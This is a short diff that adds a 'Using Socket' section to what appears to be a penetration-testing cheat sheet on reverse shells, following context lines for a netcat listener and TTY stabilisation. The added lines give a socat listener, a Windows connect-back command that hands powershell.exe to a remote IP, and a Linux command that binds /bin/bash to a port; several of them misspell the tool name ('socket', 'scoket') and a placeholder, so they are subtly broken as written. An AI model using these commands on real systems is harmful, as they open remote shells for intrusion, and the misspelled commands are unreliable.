@@ -24,3 +24,23 @@ rlwrap nc -lnvp <PORT>
 ## Press CTRL+Z to background the process.
 stty raw -echo; fg
 ```
+
+***
+
+### Using Socket
+
+Basic Listener: `socat -d -d TCP-LISTEN:<PORT> STDOUT`
+
+On Windows we use this command to connect back:
+
+```powershell
+socket TCP:<LOCAL-IP>:<LOCAP-PORT> EXEC:powershell.exe, pipes
+```
+
+> The `pipes` option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.&#x20;
+
+The equivalent command for Linux target:
+
+```
+scoket TCP-L:<PORT> EXEC:"/bin/bash" -li
+```
